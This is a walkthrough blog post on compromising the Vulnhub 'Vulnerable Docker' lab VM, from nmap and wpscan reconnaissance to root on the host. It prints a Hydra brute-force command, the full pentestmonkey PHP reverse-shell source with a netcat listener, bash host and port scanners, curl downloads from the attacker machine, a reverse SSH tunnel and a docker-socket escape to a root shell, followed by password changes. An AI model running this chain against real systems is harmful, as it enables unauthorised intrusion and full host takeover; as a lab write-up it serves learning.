---
title: 'Pentest: owning a docker host'
categories:
  - Penetration-Testing
tags:
  - Pentest
  - ctf
  - exploits

toc: true
---

As I did my bachelorthesis around Docker and best practices around Docker, I found it interesting and challenging for myself to break a Docker host.
Vulnhub provided me with a nice lab to test it out!
The VM is available [here](https://www.vulnhub.com/entry/vulnerable-docker-1,208/)

--------

## Nmap recon

As always I like to start off with an nmap scan of the target

`nmap -p- 10.0.2.9 `

```
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

Very limited ports open this time..  Let's pop open a browser and head to port 8000

-----

## Wordpress exploiting

Aha, It's a wordpress website, we got a nice tool for this called wpscan:

`wpscan 10.0.2.9:8000`

```
__          _______   _____                  
\ \        / /  __ \ / ____|                 
 \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
  \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
   \  /\  /  | |     ____) | (__| (_| | | | |
    \/  \/   |_|    |_____/ \___|\__,_|_| |_|


_______________________________________________________________

[+] URL: http://10.0.2.9:8000/

[+] robots.txt available under: 'http://10.0.2.9:8000/robots.txt'
[+] Interesting entry from robots.txt: http://10.0.2.9:8000/wp-admin/admin-ajax.php
[!] The WordPress 'http://10.0.2.9:8000/readme.html' file exists exposing a version number
[!] Full Path Disclosure (FPD) in 'http://10.0.2.9:8000/wp-includes/rss-functions.php':
[+] Interesting header: LINK: <http://10.0.2.9:8000/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.10 (Debian)
[+] Interesting header: X-POWERED-BY: PHP/5.6.31
[+] XML-RPC Interface available under: http://10.0.2.9:8000/xmlrpc.php

[+] WordPress version 4.8.4

 .... #ommited because not interesting

[+] Enumerating plugins from passive detection ...
[+] No plugins found

```

No plugins are installed, no exploits found... but we did see something very interesting in the output:
the Wordpress API is opened for us :D we can see what users exist `http://<dockervmip>:8000/wp-json/wp/v2/users`
there is only one user called "bob" chances are close to 100% that he is the admin user.

Since we have no exploits available, and we know the username, we can try a bruteforce attack

---------


## Bruteforcing Bob

Let's use Hydra to try and bruteforce the password of Bob

```
hydra 10.0.2.9 -V -l bob -P /root/Downloads/10k_most_common.txt http-get-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.0.2.9%3A8000%2Fwp-admin%2F&testcookie=1:incorrect"

```

The password is Welcome1

edit the dolly plugin to create a php shell
and setup a listener.


**example php shell script** 

```

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
//
// Daemonise ourself if possible to avoid zombies later
//
// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}
	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
// Change to a safe directory
chdir("/");
// Remove any umask we inherited
umask(0);
//
// Do the reverse shell...
//
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}
// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}
// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}
	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}
	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}
	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}
	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 



```



`nc -lvp 44444`

browse to the website and the shell will be opened

-------------------

## Reverse shell in the container
Now we have the container reverse shell

so all I did was use `ip address` to list ip routes... seems that 172.18.0.0/16 is the network this container has.

-------------------


## Uploading scripts into our container
Let's go back to our attacker machine and setup a simplehttpserver with python so we can use it as a download server for our container.
We have to do this because we cannot install anything on our container machine under current circumstances, apt is disabled, and we don't even have wget available. We can't make any scripts either, because vi,nano,vim,... is not present, sudo is also not available.

`cd <anydirectoryyouwanttouse>;python -m SimpleHttpServer `

the directory you are in is now being served on your attacker ip port 8000 by default.

I made two simple scripts in bash to mimic Nmap because installing nmap is impossible, you could try to install nmap using the deb package but you'll see that host discovery will not be available, you can however do port scanning with it but I found it not worth the time and efford.


**ipscan.sh**

```

#!/bin/bash
echo "first three octets of network to scan, end with a ."
read network
for host in {1..254}; do
    ping -c1 $network$host &>/dev/null;
    [ $? -eq 0 ] && echo "$network$host is up"
 echo "done checking host: " $network$host
done

```


**portscan.sh**

```

#!/bin/bash


echo "host to portscan: "
read host

for port in {1..65000}; do
    (echo > /dev/tcp/$host/$port) &>/dev/null
    [ $? -eq 0 ] && echo "$port open"
if [ $port == 1000 ]
then
  echo "first 1000 ports scanned"
fi

if [ $port == 65000 ]
then
echo " port scan complete"
fi

done

```

You could combine the two into one script, but in my experience it takes way longer to run when you do so. I prefer to run them one after the other.

get them into our docker machine using `curl -o ipscan.sh <attackerip>:8000/ipscan.sh` and `curl -o portscan.sh <attackerip>:8000/portscan.sh`.
in order for them to run you will have to `chmod +x ` both files and then run them using `./ipscan.sh` or `./portscan.sh `

running ipscan gave me some interesting results

```


172.18.0.1
172.18.0.2
172.18.0.3
172.18.0.4

```

all of the ip's above are live.

running portscanner on those hosts gave me the following results:

```
host to portscan:
172.18.0.1
22 open
first 1000 ports scanned
8000 open
port scan complete

172.18.0.2
first 1000 ports scanned
3306 open
port scan complete


172.18.0.3
22 open
first 1000 ports scanned
8022 open


172.18.0.4
80 open
first 1000 ports scanned
37056 open
50240 open
port scan complete


```

port 3306 is well known to be mysql default port. So I'm assuming that 172.18.0.2 is the database container

Let's see what is behind  port 8022 on ip 172.18.0.3, It's docker SSH, which is used to access consoles of containers..
If we want to access this we need to get inside this private network, preferably with a computer that is not crippled by a container user with almost no tools...

we achieve this using reverse ssh


-----


## Reverse SSH to access docker private network

in order to do this we need to download the deb package of ssh on our attacker computer, and serve it over our http server we set up before to get it into our docker container.

`https://packages.debian.org/jessie/amd64/openssh-client/download #link to download the openssh client`

put it in the folder that is being used by SimpleHttpServer and rename the deb package to openssh.deb

```
curl -o openssh.deb http://<attackerip>:8000/openssh.deb
dpkg -x openssh.deb .; cd usr/bin; chmod +x ssh*; ./ssh-keygen -P '' -f id_rsa -t rsa; cat id_rsa.pub
```

copy the rsa output and put it in your .ssh folder on your attackercomputer in the file authorized_keys, if the file does not exist yet, create it.
`chmod 600 ~/.ssh/authorized_keys`
`service ssh restart`

on the container shell issue the following command to set up a reverse SSH tunnel to the docker-ssh web portal:

` ./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i id_rsa -R 8022:<ipofdockersshcontainerfoundbyportscan>:8022 -fN root@<yourattackingip> `


-----------------------------------


## accessing the webshell and exploiting this setup

now we can access the webshell in our attackerpc browser, sweet.
this instance has a working apt package manager, we can install curl and docker without much problems...
`apt-get update`
`apt-get install curl `
`curl -fsSL get.docker.com -o get-docker.sh`
`sh get-docker.sh`

`docker ps` seems to show us all containers running, this means that the docker socket is mounted on this container, and it's being run as the root user.. this makes it easy.

` docker run -v /:/hostOS -it chrisfosterelli/rootplease ` will give you a root shell in the docker host machine...

now we can look for users with passwords
`vipw -s`

I see a whale user and changed his password with `passwd whale`, I also made a root password change with `passwd`

Now on your attacker machine you can ssh to the docker host with `ssh whale@<dockerhostvmip>` and entering the password you just entered.

## I AM root

Now you can just  `su - ` and use the password you set for root.
